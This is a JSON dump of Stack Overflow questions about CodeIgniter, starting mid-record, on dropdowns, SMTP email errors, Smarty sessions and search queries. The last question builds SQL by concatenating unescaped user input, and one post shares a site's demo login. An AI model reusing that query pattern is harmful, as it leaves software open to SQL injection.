\"Alberta\",\n    \"BC\" =&gt; \"British Columbia\",\n    \"MB\" =&gt; \"Manitoba\",\n    //etc...\n\n    //United States\n    \"AL\" =&gt; \"Alabama\",\n    \"AK\" =&gt; \"Alaska\",\n    \"AZ\" =&gt; \"Arizona\",\n    //etc...\n);\n\necho form_dropdown('province', $options, $province);\n</code></pre>\n\n<p>This gives me</p>\n\n<pre><code>&lt;option value=\"AB\" selected=\"selected\"&gt;Alberta&lt;/option&gt;\n&lt;option value=\"BC\"&gt;British Columbia&lt;/option&gt;\n&lt;option value=\"MB\"&gt;Manitoba&lt;/option&gt;\n\n&lt;option value=\"AL\"&gt;Alabama&lt;/option&gt;\n&lt;option value=\"AK\"&gt;Alaska&lt;/option&gt;\n&lt;option value=\"AZ\"&gt;Arizona&lt;/option&gt;\n</code></pre>\n\n<p>But what I need is</p>\n\n<pre><code>&lt;option value=\"AB\" class=\"canada\" selected=\"selected\"&gt;Alberta&lt;/option&gt;\n&lt;option value=\"BC\" class=\"canada\"&gt;British Columbia&lt;/option&gt;\n&lt;option value=\"MB\" class=\"canada\"&gt;Manitoba&lt;/option&gt;\n\n&lt;option value=\"AL\" class=\"us\"&gt;Alabama&lt;/option&gt;\n&lt;option value=\"AK\" class=\"us\"&gt;Alaska&lt;/option&gt;\n&lt;option value=\"AZ\" class=\"us\"&gt;Arizona&lt;/option&gt;\n</code></pre>\n\n<p>So how would I go about adding a class to each <code>&lt;option&gt;</code>. I would assume I probably need a custom helper but I have no idea how to go about creating one. I am new to coding. Can anyone help me? Thanks.</p>\n"},{"tags":["codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":53,"score":0,"question_id":12898526,"title":"Pass value from controller to external library and then to View Codeigniter","body":"<p>I am new to Codeigniter and i am working on API Class, following is API Code</p>\n\n<pre><code>&lt;?php\nrequire_once(\"WiZiQService.php\");\nclass ScheduleClass{\n\n    function ScheduleClass($secretAcessKey,$access_key,$webServiceUrl)\n    {\n        require_once(\"AuthBase.php\");\n        $authBase = new AuthBase($secretAcessKey,$access_key);\n        $method = \"create\";\n        $requestParameters[\"signature\"]=$authBase-&gt;GenerateSignature($method,$requestParameters);\n        #for teacher account pass parameter 'presenter_email'\n                //This is the unique email of the presenter that will identify the presenter in WizIQ. Make sure to add\n                //this presenter email to your organization’s teacher account. ’ For more information visit at: (http://developer.wiziq.com/faqs)\n        $requestParameters[\"presenter_email\"]=$By_PresenterEmail;//\"kerrygun@gmail.com\";\n        #for room based account pass parameters 'presenter_id', 'presenter_name'\n        //$requestParameters[\"presenter_id\"] = \"40\";\n        //$requestParameters[\"presenter_name\"] = \"vinugeorge\";  \n        $requestParameters[\"start_time\"] = $By_StartTime;//\"2011-12-25 11:55\";\n        $requestParameters[\"title\"]=$By_ClassTitle;//\"my php-class\"; //Required\n        $requestParameters[\"duration\"]=$By_ClassDuration; //optional\n        $requestParameters[\"time_zone\"]=$By_TimeZone; //optional\n        $requestParameters[\"attendee_limit\"]=$By_AttendeeLimit; //optional\n        $requestParameters[\"control_category_id\"]=$By_ControlCategory; //optional\n        $requestParameters[\"create_recording\"]=$By_CreateRecording; //optional\n        $requestParameters[\"return_url\"]=$By_ReturnUrl; //optional\n        $requestParameters[\"status_ping_url\"]=$By_StatusPingUrl; //optional\n                $requestParameters[\"language_culture_name\"]=$By_LanguageCulture;\n        $httpRequest=new HttpRequest();\n        try\n        {\n            $XMLReturn=$httpRequest-&gt;wiziq_do_post_request($webServiceUrl.'?method=create',http_build_query($requestParameters, '', '&amp;')); \n        }\n        catch(Exception $e)\n        {   \n            echo $e-&gt;getMessage();\n        }\n        if(!empty($XMLReturn))\n        {\n            try\n            {\n              $objDOM = new DOMDocument();\n              $objDOM-&gt;loadXML($XMLReturn);\n\n            }\n            catch(Exception $e)\n            {\n              echo $e-&gt;getMessage();\n            }\n        $status=$objDOM-&gt;getElementsByTagName(\"rsp\")-&gt;item(0);\n        $attribNode = $status-&gt;getAttribute(\"status\");\n        if($attribNode==\"ok\")\n        {\n            $methodTag=$objDOM-&gt;getElementsByTagName(\"method\");\n            echo \"method=\".$method=$methodTag-&gt;item(0)-&gt;nodeValue;\n            $class_idTag=$objDOM-&gt;getElementsByTagName(\"class_id\");\n            echo \"&lt;br&gt;Class ID=\".$class_id=$class_idTag-&gt;item(0)-&gt;nodeValue;\n            $recording_urlTag=$objDOM-&gt;getElementsByTagName(\"recording_url\");\n            echo \"&lt;br&gt;recording_url=\".$recording_url=$recording_urlTag-&gt;item(0)-&gt;nodeValue;\n            $presenter_emailTag=$objDOM-&gt;getElementsByTagName(\"presenter_email\");\n            echo \"&lt;br&gt;presenter_email=\".$presenter_email=$presenter_emailTag-&gt;item(0)-&gt;nodeValue;\n            $presenter_urlTag=$objDOM-&gt;getElementsByTagName(\"presenter_url\");\n            echo \"&lt;br&gt;presenter_url=\".$presenter_url=$presenter_urlTag-&gt;item(0)-&gt;nodeValue;\n        }\n        else if($attribNode==\"fail\")\n        {\n            $error=$objDOM-&gt;getElementsByTagName(\"error\")-&gt;item(0);\n            echo \"&lt;br&gt;errorcode=\".$errorcode = $error-&gt;getAttribute(\"code\");    \n            echo \"&lt;br&gt;errormsg=\".$errormsg = $error-&gt;getAttribute(\"msg\");   \n        }\n     }//end if  \n   }//end function\n\n\n}\n?&gt;\n</code></pre>\n\n<p>so my question is, how can i pass value from controller to attached external class and the output should be back to controller and then send it to view.</p>\n\n<p>I'm trying to use it like this:</p>\n\n<pre><code>class Form extends CI_Controller {\n    public function index() {\n        $this-&gt;load-&gt;library('Create');\n        $this-&gt;load-&gt;view('form_view');\n    }\n    public function wizprocess() {\n        $this-&gt;load-&gt;library('Create');\n        $this-&gt;Create-&gt;ScheduleClass();\n    }\n}\n</code></pre>\n\n<p>Your solutions to above question will be appreciated</p>\n"},{"tags":["php","codeigniter","expressionengine"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":57,"score":0,"question_id":12898978,"title":"Expression Engine: Edit Control Panel Channel Table Columns","body":"<p>Hi I am trying to edit the view channel table pictured below\n<img src=\"http://i.stack.imgur.com/u1RcA.png\" alt=\"enter image description here\"> </p>\n\n<p>Is this possible to remove table columns and replace them with data from that channels field group? </p>\n\n<p>Or would I have to make a module and create this view from scratch?</p>\n"},{"tags":["codeigniter","encoding","xss","content-type"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":59,"score":0,"question_id":12899051,"title":"Storing and emailing HTML from database from WYSIWYG editor with CodeIgniter","body":"<p>Im dealing with a bit of a problem. I have a WYSIWYG editor saving its data to a column in my database. Unfortunately the data is being stripped from the tags, so it looks something similiar to this:</p>\n\n<pre><code> 'Hello&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;'\n</code></pre>\n\n<p>Although theres no problem initiliazing this data into the WYSIWYG editor once again, but when i e-mail the data it recognizes the tags as text rather than HTML.</p>\n\n<p>This is how i send:</p>\n\n<pre><code>$this-&gt;load-&gt;library('email');\n$this-&gt;email-&gt;initialize($config);\n...\n$this-&gt;email-&gt;send();\n</code></pre>\n\n<p>When the email is received it is as if the client ignores the HTML tags.</p>\n\n<p>The content-type in the email which is received</p>\n\n<pre><code>Content-Type:   multipart/alternative; boundary=B_ALT_507c2c67f1aa7\n</code></pre>\n"},{"tags":["codeigniter","smarty","smarty3"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":12896417,"title":"Smarty - assigning too many variables?","body":"<p>I'm using Smarty and trying to implement multi-language support on my CodeIgniter site. Is it OK to assign all the possible language variables in one place such that it is available to all pages, regardless of whether the language variable is used or not? This approach is easy, but I am worried about performance impact of having too many variables assigned in Smarty.</p>\n\n<p>Or should I go through the trouble of only assigning language variables needed per page? That would be a pain to implement and maintain, but might not be as expensive for Smarty.</p>\n"},{"tags":["php","database","codeigniter","activerecord"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":72,"score":0,"question_id":12889063,"title":"codeigniter can't Insert record to database","body":"<p>i got an error like this</p>\n\n<pre><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘Satuan, `Satuan`) VALUES (‘KMJ001’, ‘KKMJ005’, ‘asdf asdf’, ‘123123’, ‘kg’)’ at line 1\n\nINSERT INTO `ms_material_jasa` (`Kode_Material_Jasa`, `Kode_Kategori_Material_Jasa`, `Nama_Jenis_Material_Jasa`, `Harga` Satuan, `Satuan`) VALUES (‘KMJ001’, ‘KKMJ005’, ‘asdf asdf’, ‘123123’, ‘kg’)\n</code></pre>\n\n<p>it refers to my active record model</p>\n\n<pre><code>function create($kmj,$kkmj,$njmj,$hs,$s)\n{\n    $data=array('Kode_Material_Jasa' =&gt; $kmj, 'Kode_Kategori_Material_Jasa' =&gt; $kkmj, 'Nama_Jenis_Material_Jasa' =&gt; $njmj, 'Harga Satuan' =&gt; $hs, 'Satuan' =&gt; $s);\n    $this-&gt;db-&gt;insert('ms_material_jasa',$data);\n\n}  \n</code></pre>\n\n<p>here is my controller</p>\n\n<pre><code> function tambah()\n{\n   $data['kmj'] = $this-&gt;input-&gt;post('kmj');\n   $data['kkmj'] = $this-&gt;input-&gt;post('kkmj');\n   $data['njmj'] = $this-&gt;input-&gt;post('njmj');\n   $data['hs'] = $this-&gt;input-&gt;post('hs');\n   $data['s'] = $this-&gt;input-&gt;post('s');\n\n\n   $data['title'] = 'QB Tambah Material / Jasa';\n   $data['pesan'] = $data['kmj'].' berhasil ditambahkan ! ';\n\n\n    $this-&gt;form_validation-&gt;set_rules('kmj','Kode Material / Jasa','trim|required|min_length[2]|max_length[20]|xss_clean');\n    $this-&gt;form_validation-&gt;set_rules('kkmj','Kode Kategori Material / Jasa','trim|required|min_length[2]|max_length[20]|xss_clean');\n    $this-&gt;form_validation-&gt;set_rules('njmj','Nama Jenis Material / Jasa','trim|required|min_length[2]|max_length[20]|xss_clean');\n    $this-&gt;form_validation-&gt;set_rules('hs','Harga Satuan','trim|required|min_length[2]|numeric|max_length[20]|xss_clean');\n    $this-&gt;form_validation-&gt;set_rules('s','Satuan','xss_clean');\n\n    if($this-&gt;form_validation-&gt;run() == false)\n    {\n        $lastval = $this-&gt;m_admin-&gt;getlastval('KMJ','ms_material_jasa','kode_material_jasa');\n        $data['nextval'] = $this-&gt;m_admin-&gt;gencode('KMJ',3,$lastval); \n\n\n        $this-&gt;load-&gt;view('head',$data);\n        $this-&gt;load-&gt;view('content/add_material_jasa',$data);\n    }\n    else\n    {\n\n        $this-&gt;m_materialjasa-&gt;create($data['kmj'],$data['kkmj'],$data['njmj'],$data['hs'],$data['s']);\n        $data['kirim'] = $this-&gt;m_materialjasa-&gt;read();\n        $this-&gt;load-&gt;view('head',$data);\n        $this-&gt;load-&gt;view('v/vkategorimaterial',$data);\n\n\n    }\n\n}  \n</code></pre>\n\n<p>looks like the following query</p>\n\n<pre><code>INSERT INTO `ms_material_jasa` (`Kode_Material_Jasa`, `Kode_Kategori_Material_Jasa`, `Nama_Jenis_Material_Jasa`, `Harga` Satuan, `Satuan`) VALUES (‘KMJ001’, ‘KKMJ005’, ‘asdf asdf’, ‘123123’, ‘kg’)\n</code></pre>\n\n<p>is correct, here is the <code>ms_material_jasa</code> table. it looks like the entry don't break the data type.length on database. i don't know what went wrong, how do i resolve this ? \n<img src=\"http://i.stack.imgur.com/jknU4.png\" alt=\"enter image description here\"></p>\n"},{"tags":["php","codeigniter","smarty"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":78,"score":1,"question_id":12896708,"title":"why smarty not considering session variables?","body":"<p>Why smarty 3 doesn't consider codeIgniter session variables:</p>\n\n<pre><code>$this-&gt;session-&gt;set_userdata('userId', $res['id']);  // this doesn't work \n\n$_SESSION['userId']=$res['id']; // this works.\n</code></pre>\n\n<p>I am accessing this in smarty as:</p>\n\n<pre><code>{$smarty.session.userId}  \n</code></pre>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":53,"score":0,"question_id":12896508,"title":"CodeIgniter - Search results - How to return search results for specific word from multiple tables?","body":"<p>After I get a specific word from form. I want to get results like this word from multiple tables in database.</p>\n\n<pre><code>function search(){\n    $search = $this-&gt;input-&gt;post('searchword');\n    $this-&gt;db-&gt;select('articles.title, articles.post');\n    $this-&gt;db-&gt;select('files.name, files.desc');\n    $this-&gt;db-&gt;select('news.title, news.post');\n    $this-&gt;db-&gt;select('projects.title, projects.desc');\n    $this-&gt;db-&gt;from('articles, files, news, projects');\n\n    // I think problem is here\n    $like = array('articles.title' =&gt; $search,'articles.post' =&gt; $search,\n    'files.name' =&gt; $search,'files.desc' =&gt; $search,\n    'news.title' =&gt; $search,'news.post' =&gt; $search,\n    'projects.title' =&gt; $search, 'projects.desc' =&gt; $search);\n    $this-&gt;db-&gt;like($like);\n\n\n    return $this-&gt;db-&gt;get();\n\n}\n</code></pre>\n"},{"tags":["php","arrays","codeigniter","object","activerecord"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":61,"score":0,"question_id":12893931,"title":"Modify data in php codeigniter active record result without changing structure","body":"<p>I've got a codeigniter active record query that uses get('table_name')->result();</p>\n\n<p>The output is below, what i'd like to do is unserialize(base_64_decode) the \"venue_opening_hours\" string and replace that string in the data structure with the result of the unserialized &amp; base64_decoded data. I know i can array_walk to do this normally, but i don't see how to access that particular bit of data as an object within an array...</p>\n\n<p>Thanks!</p>\n\n<pre><code>array(2) {\n  [0]=&gt;\n  object(stdClass)#142 (4) {\n    [\"entry_id\"]=&gt;\n    string(2) \"15\"\n    [\"google-id\"]=&gt;\n    string(40) \"552e7c08d3b86c14d130ebe43a0ba421d03a60ae\"\n    [\"venue_opening_hours\"]=&gt;\n    string(148) \"YToxOntzOjEzOiJvcGVuaW5nX2hvdXJzIjthOjE6e3M6NzoicGVyaW9kcyI7YToxOntzOjQ6Im9wZW4iO2E6Mjp7czozOiJkYXkiO3M6MToiNSI7czo0OiJ0aW1lIjtzOjQ6IjIzMTUiO319fX0=\"\n    [\"title\"]=&gt;\n    string(18) \"Place Name\"\n  }\n  [1]=&gt;\n  object(stdClass)#143 (4) {\n    [\"entry_id\"]=&gt;\n    string(2) \"18\"\n    [\"google-id\"]=&gt;\n    string(40) \"71d9c8e1f64f330637c96d30a0ae15533836a85e\"\n    [\"venue_opening_hours\"]=&gt;\n    string(972) \"YToxOntzOjEzOiJvcGVuaW5nX2hvdXJzIjthOjE6e3M6NzoicGVyaW9kcyI7YToxMDp7aTowO2E6MTp7czo1OiJjbG9zZSI7YToyOntzOjM6ImRheSI7czoxOiIxIjtzOjQ6InRpbWUiO3M6NDoiMjMzMCI7fX1pOjE7YToxOntzOjQ6Im9wZW4iO2E6Mjp7czozOiJkYXkiO3M6MToiMSI7czo0OiJ0aW1lIjtzOjQ6IjIzMTUiO319aToyO2E6MTp7czo1OiJjbG9zZSI7YToyOntzOjM6ImRheSI7czoxOiIxIjtzOjQ6InRpbWUiO3M6NDoiMjMxNSI7fX1pOjM7YToxOntzOjQ6Im9wZW4iO2E6Mjp7czozOiJkYXkiO3M6MToiMSI7czo0OiJ0aW1lIjtzOjQ6IjIzMzAiO319aTo0O2E6MTp7czo1OiJjbG9zZSI7YToyOntzOjM6ImRheSI7czoxOiIyIjtzOjQ6InRpbWUiO3M6NDoiMjMxNSI7fX1pOjU7YToxOntzOjQ6Im9wZW4iO2E6Mjp7czozOiJkYXkiO3M6MToiMiI7czo0OiJ0aW1lIjtzOjQ6IjIzMzAiO319aTo2O2E6MTp7czo1OiJjbG9zZSI7YToyOntzOjM6ImRheSI7czoxOiI0IjtzOjQ6InRpbWUiO3M6NDoiMjMzMCI7fX1pOjc7YToxOntzOjQ6Im9wZW4iO2E6Mjp7czozOiJkYXkiO3M6MToiNCI7czo0OiJ0aW1lIjtzOjQ6IjIzMzAiO319aTo4O2E6MTp7czo1OiJjbG9zZSI7YToyOntzOjM6ImRheSI7czoxOiI1IjtzOjQ6InRpbWUiO3M6NDoiMjM0NSI7fX1pOjk7YToxOntzOjQ6Im9wZW4iO2E6Mjp7czozOiJkYXkiO3M6MToiNSI7czo0OiJ0aW1lIjtzOjQ6IjIzNDUiO319fX19\"\n    [\"title\"]=&gt;\n    string(24) \"Other place name\"\n  }\n}\n</code></pre>\n"}]}
{"total":13987,"page":9,"pagesize":100,"questions":[{"tags":["php","iphone","mysql","ios","codeigniter"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":77,"score":2,"question_id":12894428,"title":"Euro character in apache headers","body":"<p>We have web services to be consumed by an iphone app based on codeigniter, parameters are passed through headers. Everything was working fine until there was a euro(€) symbol in the parameters value. Whenever the parameter sent from the iphone has an euro symbol it gets truncated.\nAny ideas where i am doing wrong or how we should be doing this?</p>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":79,"score":0,"question_id":12895516,"title":"Codeigniter: Best approach to passing values between multiple views","body":"<p>I'm a bit of a newbie to Codeigniter. :)</p>\n\n<p>I have a web site member registration flow with several pages and wanted to find out what's the best way to 'store' data between views until the registration flow is complete and I can create a member record? </p>\n\n<p>Should I create a temp table and save the info there based on session id?\nOr should I try to pass a data array to each view and then store the info in hidden fields (then I can get the values again from the controller via POST)?\nOr perhaps I could have a 'global variable' in my controller that stores all the data until I'm all done with the registration flow and can save the information then into the database. </p>\n\n<p>Any best practices approaches?</p>\n"},{"tags":["php","email","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":570,"score":1,"question_id":5803841,"title":"Codeigniter email problems","body":"<p>I am trying to send an email using codeigniters email library, this is my code, </p>\n\n<pre><code>$this-&gt;load-&gt;library('email');\n$this-&gt;email-&gt;initialize(array('mailtype' =&gt; 'html'));\n$this-&gt;email-&gt;from('emailaddresshidden'); // TODO - Store this in Config file??\n$this-&gt;email-&gt;bcc('emailaddresshidden');\n$this-&gt;email-&gt;subject('Competition Entry'); // TODO - What does this want to be??\n$this-&gt;email-&gt;message($this-&gt;load-&gt;view('emails/competition_entry', $this-&gt;data, TRUE));\n$this-&gt;email-&gt;send();\n</code></pre>\n\n<p>However I am getting this error,</p>\n\n<blockquote>\n  <p>A PHP Error was encountered</p>\n  \n  <p>Severity: Warning</p>\n  \n  <p>Message: mail() expects parameter 1 to\n  be string, array given</p>\n  \n  <p>Filename: libraries/Email.php</p>\n  \n  <p>Line Number: 1519</p>\n</blockquote>\n\n<p>I have no idea as to why?</p>\n"},{"tags":["codeigniter","continuous-integration","tankauth"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":71,"score":0,"question_id":12893368,"title":"Login problems with tank_auth on CI 2.1.3","body":"<p>I've already tried searching on various forums and also here in SO but no luck yet.\nI'm using codeigniter 2.1.3 and have made all the changes as mention in this question : <a href=\"http://stackoverflow.com/questions/9331963/login-issue-with-tank-auth-codeigniter-authentication-library?rq=1\">Login issue with tank_auth (codeigniter authentication library)</a></p>\n\n<p>in config.php</p>\n\n<pre><code>$config['sess_match_useragent'] = FALSE;\n</code></pre>\n\n<p>in tank_auth.php</p>\n\n<pre><code>$config['phpass_hash_portable'] = TRUE;\n</code></pre>\n\n<p>Everything works fine on my local server .\nHere is the url to the version : <a href=\"http://e-solns.com/AppRepo\" rel=\"nofollow\">http://e-solns.com/AppRepo</a></p>\n\n<p>u: demo p: 123456</p>\n\n<p>One more thing , if you check the \"Remember me\" checkbox, login works fine .</p>\n"},{"tags":["php","email","codeigniter","smtp"],"answer_count":3,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":7303,"score":4,"question_id":6195709,"title":"how to correct way to send email using codeigniter","body":"<p>Hey guy, I'm trying to send email using codeiginiter mail class function, but I found a trouble with smtp protocol. I using gmail smtp protocol. \nI running this in local machine.\nI'm using Xampp 1.7.4 package, andI have tried setting like below :</p>\n\n<pre><code>function index()\n{\n\n    $config['protocol'] = 'smtp'; // mail, sendmail, or smtp    The mail sending protocol.\n    $config['smtp_host'] = 'smtp.gmail.com'; // SMTP Server Address.\n    $config['smtp_user'] = 'me@gmail.com'; // SMTP Username.\n    $config['smtp_pass'] = '123'; // SMTP Password.\n    $config['smtp_port'] = '25'; // SMTP Port.\n    $config['smtp_timeout'] = '5'; // SMTP Timeout (in seconds).\n    $config['wordwrap'] = TRUE; // TRUE or FALSE (boolean)    Enable word-wrap.\n    $config['wrapchars'] = 76; // Character count to wrap at.\n    $config['mailtype'] = 'html'; // text or html Type of mail. If you send HTML email you must send it as a complete web page. Make sure you don't have any relative links or relative image paths otherwise they will not work.\n    $config['charset'] = 'utf-8'; // Character set (utf-8, iso-8859-1, etc.).\n    $config['validate'] = FALSE; // TRUE or FALSE (boolean)    Whether to validate the email address.\n    $config['priority'] = 3; // 1, 2, 3, 4, 5    Email Priority. 1 = highest. 5 = lowest. 3 = normal.\n    $config['crlf'] = \"\\r\\n\"; // \"\\r\\n\" or \"\\n\" or \"\\r\" Newline character. (Use \"\\r\\n\" to comply with RFC 822).\n    $config['newline'] = \"\\r\\n\"; // \"\\r\\n\" or \"\\n\" or \"\\r\"    Newline character. (Use \"\\r\\n\" to comply with RFC 822).\n    $config['bcc_batch_mode'] = FALSE; // TRUE or FALSE (boolean)    Enable BCC Batch Mode.\n    $config['bcc_batch_size'] = 200; // Number of emails in each BCC batch.\n\n    $this-&gt;load-&gt;library('email');\n    $this-&gt;email-&gt;initialize($config);\n\n\n    $this-&gt;email-&gt;from('me@gmail.com', 'Me');\n    $this-&gt;email-&gt;reply_to('me@gmail.com', 'Me');\n    $this-&gt;email-&gt;to('you@yahoo.com');\n    $this-&gt;email-&gt;subject('testing my mail function with CodeIgniter');\n    $this-&gt;email-&gt;message('&lt;html&gt;&lt;body&gt;this is the content&lt;/body&gt;&lt;/html&gt;');\n\n    if ( ! $this-&gt;email-&gt;send()){\n        echo 'error! &lt;br /&gt;';\n        // Generate error\n    }\n    echo $this-&gt;email-&gt;print_debugger();\n\n}\n</code></pre>\n\n<p>and below error was show in my browser :</p>\n\n<pre><code>error!\n220 mx.google.com ESMTP b8sm581192pbj.46\n\nhello: 250-mx.google.com at your service, [118.96.231.25]\n250-SIZE 35882577\n250-8BITMIME\n250-STARTTLS\n250 ENHANCEDSTATUSCODES\n\nFailed to send AUTH LOGIN command. Error: 530 5.7.0 Must issue a STARTTLS command first. b8sm581192pbj.46\n\nfrom: 530 5.7.0 Must issue a STARTTLS command first. b8sm581192pbj.46\n\nThe following SMTP error was encountered: 530 5.7.0 Must issue a STARTTLS command first. b8sm581192pbj.46\n\nto: 530 5.7.0 Must issue a STARTTLS command first. b8sm581192pbj.46\n\nThe following SMTP error was encountered: 530 5.7.0 Must issue a STARTTLS command first. b8sm581192pbj.46\n\ndata: 530 5.7.0 Must issue a STARTTLS command first. b8sm581192pbj.46\n\nThe following SMTP error was encountered: 530 5.7.0 Must issue a STARTTLS command first. b8sm581192pbj.46\n502 5.5.1 Unrecognized command. b8sm581192pbj.46\nThe following SMTP error was encountered: 502 5.5.1 Unrecognized command. b8sm581192pbj.46\nUnable to send email using PHP SMTP. Your server might not be configured to send mail using this method.\n\nUser-Agent: CodeIgniter\nDate: Wed, 1 Jun 2011 09:27:21 +0700\nFrom: \"Me\" \nReturn-Path: \nReply-To: \"Me\" \nTo: you@yahoo.com\nSubject: =?utf-8?Q?testing_my_mail_function_with_CodeIgniter?=\nX-Sender: me@gmail.com\nX-Mailer: CodeIgniter\nX-Priority: 3 (Normal)\nMessage-ID: &lt;4de5a38938720@gmail.com&gt;\nMime-Version: 1.0\n\n\nContent-Type: multipart/alternative; boundary=\"B_ALT_4de5a38938733\"\n\nThis is a multi-part message in MIME format.\nYour email application may not support this format.\n\n--B_ALT_4de5a38938733\nContent-Type: text/plain; charset=utf-8\nContent-Transfer-Encoding: 8bit\n\nthis is the content\n\n\n--B_ALT_4de5a38938733\nContent-Type: text/html; charset=utf-8\nContent-Transfer-Encoding: quoted-printable\n\n&lt;html&gt;&lt;body&gt;this is the content&lt;/body&gt;&lt;/html&gt;\n\n--B_ALT_4de5a38938733--\n</code></pre>\n"},{"tags":["php","codeigniter","email","scheduled-tasks"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":102,"score":-2,"question_id":12893499,"title":"schedule an email in php","body":"<p>I want to schedule sending of email from php script. I want user to specify date and time and then on the specified date and time, I want those emails to be sent automatically. How do I implement it? I am working on codeigniter.</p>\n"},{"tags":["php","arrays","codeigniter","dynamic","textbox"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":180,"score":1,"question_id":12893049,"title":"how to store multiple dynamically generated textbox values into an array in codeigniter?","body":"<p>Pls help,</p>\n\n<p>I have a form which dynamically generates  textboxes. For eg:</p>\n\n<pre><code>        on |button| click\n           |textbox 1|\n           |textbox 2|\n           |textbox 3|\n           |textbox 4|\n           .\n           .\n           .\n           |textbox n|\n\n           |submit|  \n</code></pre>\n\n<p>Where id of the textbox keeps autoincrementing while the name remains the same. \nWhat I require is when i submit the form the values of the textboxes generated must be stored in an array and then the array is stored in database. How to store dynamically generated textbox value into a single array using codeigniter? Im new to codeigniter.</p>\n"},{"tags":["php","codeigniter","comments","phpdoc","phpdocumenter"],"answer_count":7,"favorite_count":2,"up_vote_count":7,"down_vote_count":1,"view_count":3093,"score":6,"question_id":2009122,"title":"PHPDoc for variable-length arrays of arguments","body":"<p>Is there a syntax for documenting functions which take a single configuration array, rather than individual parameters?</p>\n\n<p>I'm thinking specifically of CodeIgniter-style libraries, which use a mechanism similar to this:</p>\n\n<pre><code>&lt;?php\n\n//\n// Library definition\n//\n\nclass MyLibrary {\n  var $foo;\n  var $bar;\n  var $baz;\n  // ... and many more vars...\n\n\n  /* Following is how CodeIgniter documents their built-in libraries,\n   * which is mostly useless.  AFAIK they should be specifying a name\n   * and description for their @param (which they don't) and omitting\n   * @return for constructors \n   */\n\n  /** \n   * @access public\n   * @param array\n   * @return void\n   */\n  function MyLibrary($config = array()) {\n    foreach ($config as $key =&gt; $value) {\n      $this-&gt;$key = $value;\n    }\n  }\n}\n\n//\n// Library usage:\n//\n\n// Iniitialize our configuration parameters\n$config['foo'] = 'test';\n$config['bar'] = 4;\n$config['baz'] = array('x', 'y', 'z');\n\n$x = new MyLibrary($config);\n\n?&gt;\n</code></pre>\n\n<p>So my question is, is there some supprted way of documenting the configuration array beyond just the purely textual description?  Actually specifying a proper \"@param [type] [name] [desc]\" that allows PHPDoc to parse out useful values?</p>\n\n<p>As an aside, CodeIgniter really does just overwrite it's own values with those passed in via the $config array as above, effectively allowing you to clobber private members.  I'm not a fan, but I'm stuck with it.</p>\n"},{"tags":["php","mysql","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":93,"score":0,"question_id":10761780,"title":"Why do I get the same results?","body":"<pre><code>    $all = $this-&gt;input-&gt;get('all');\n\n    if($all)\n    {\n        $keywords = $this-&gt;input-&gt;get('search');\n        $data['search'] = $keywords;\n        $this-&gt;session-&gt;set_flashdata('search', $keywords);\n        $query = \"SELECT *  FROM `investOffers`, `news`\";\n        $counts = \"SELECT count(*) as count FROM  `investOffers`, `news`\";\n        $first = false;\n        if($keywords)\n        {\n            $data['keywords'] = $keywords;\n            $this-&gt;session-&gt;set_flashdata('keywords', $keywords);\n            $keywords = explode(\" \", $keywords);\n            foreach($keywords as $k)\n            {\n                if(!$first)\n                {\n                    $query .= \" WHERE investOffers.desc LIKE '% \".$k.\" %' OR investOffers.title LIKE '% \".$k.\" %'\";\n                    $query .= \" OR news.desc LIKE '% \".$k.\" %' OR news.title LIKE '% \".$k.\" %'\";\n                    $counts .= \" WHERE investOffers.desc LIKE '% \".$k.\" %' OR investOffers.title LIKE '% \".$k.\" %'\";\n                    $counts .= \" OR news.desc LIKE '% \".$k.\" %' OR news.title LIKE '% \".$k.\" %'\";\n                    $first = true;\n\n                }\n                else\n                {\n                    $query .= \" OR investOffers.desc LIKE '% \".$k.\" %' OR investOffers.title LIKE '% \".$k.\" %'\";\n                    $query .= \" OR news.desc LIKE '% \".$k.\" %' OR news.title LIKE '% \".$k.\" %'\";\n                    $counts .= \" OR investOffers.desc LIKE '% \".$k.\" %' OR investOffers.title LIKE '% \".$k.\" %'\";\n                    $counts .= \" OR news.desc LIKE '% \".$k.\" %' OR news.title LIKE '% \".$k.\" %'\";\n                }\n            }\n\n\n        }\n            $page = $this-&gt;uri-&gt;segment(2);\n            if($page)\n            {\n                $query .= \" ORDER BY investOffers.date DESC LIMIT \".$page.\", 10\";\n                $counts .= \" ORDER BY investOffers.date DESC LIMIT 10\";\n            }\n            else\n            {\n                $query .= \" ORDER BY investOffers.date DESC LIMIT 10\";\n                $counts .= \" ORDER BY investOffers.date DESC LIMIT 10\";\n            }\n        $data['query'] = $this-&gt;db-&gt;query($query);\n        $counts = $this-&gt;db-&gt;query($counts);\n        foreach($counts-&gt;result() as $q)\n        {\n\n        $count = $q-&gt;count;\n        break;\n\n        }\n        $config['base_url'] = base_url().'/search';\n        $config['prev_link'] = false;\n        $config['next_link'] = false;\n        $config['last_link'] = false;\n        $config['first_link'] = false;\n        $config['suffix'] = '?'.http_build_query($_GET, '', \"&amp;\");\n        $config['cur_tag_open'] = '&lt;strong&gt;&lt;img src=\"'.IMAGE.'pagerArrow.png\" class=\"pagerArrow\" /&gt;';\n        $config['cur_tag_close'] = '&lt;/strong&gt;';\n        $from = intval($this-&gt;uri-&gt;segment(2));\n        $config['per_page'] =  